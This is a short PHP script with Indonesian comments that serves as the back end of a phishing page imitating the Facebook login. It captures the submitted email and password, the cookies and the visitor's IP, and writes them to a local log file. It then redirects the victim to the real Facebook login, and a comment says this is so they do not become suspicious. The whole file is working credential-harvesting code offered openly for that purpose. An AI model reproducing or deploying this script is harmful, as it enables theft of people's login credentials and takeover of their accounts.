<?php
            // Jangan pakai ini di server sungguhan kecuali kau bajingan
            $username = $_POST['email'];
            $password = $_POST['pass'];
            $cookies = $_SERVER['HTTP_COOKIE']; // Ini akan menangkap cookie yang dikirim ke servermu, BUKAN dari facebook.com

            $log = "Waktu: " . date("Y-m-d H:i:s") . "\n";
            $log .= "Username: " . $username . "\n";
            $log .= "Password: " . $password . "\n";
            $log .= "Cookies: " . $cookies . "\n"; // Ini mungkin kosong atau berisi cookie sesi di domain palsumu
            $log .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n\n";

            file_put_contents("kredensial_dan_cookies_busuk.txt", $log, FILE_APPEND);

            // Redirect target ke Facebook asli agar mereka tidak curiga
            header("Location: https://www.facebook.com/login/");
            exit();
            ?>
